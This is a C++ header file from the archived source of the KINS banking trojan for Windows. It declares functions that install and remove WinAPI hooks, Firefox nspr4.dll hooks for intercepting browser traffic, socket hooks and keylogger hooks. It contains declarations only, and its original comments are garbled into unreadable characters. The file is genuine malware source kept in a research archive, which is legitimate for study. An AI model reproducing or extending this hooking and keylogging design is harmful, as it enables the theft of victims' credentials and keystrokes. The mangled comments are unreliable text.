/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������� ��������� WinAPI.

  ������ ������ ����������� Core, � �� ����� ����� ���� ����� �� ��������� ����������.
  �� ������������ ����������� unhook �� ��������.
*/
#pragma once

namespace WinApiTables
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ��� �������� ������������. 

    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool _setUserHooks(void);

  /*
    ������ ����� ��� �������� ������������.

    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool _removeUserHooks(void);

  /*
    ������� ���������� �������� ��� nspr4.dll. 

    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool _trySetNspr4Hooks(void);

  /*
    ������� ���������� �������� ��� nspr4.dll. 

    IN moduleName   - ������ ��� ��������������� ������.
    IN moduleHandle - ����� ��������������� ������.
    
    Return          - true - � ������ ������,
                      false - � ������ ������.
  */
  bool _trySetNspr4HooksEx(LPWSTR moduleName, HMODULE moduleHandle);

  /*
    ��������� ��� nspr4.dll. 

    IN nspr4Handle - ����� nspr4.dll.
    
    Return         - true - � ������ ������,
                     false - � ������ ������.
  */
  bool _setNspr4Hooks(HMODULE nspr4Handle);

  bool _setSocketHooks();

  bool _removeNspr4Hooks();

  bool _setKeyloggerHooks(void);

  bool _removeKeyloggerHooks(void);

  bool _removeSocketHooks();
};
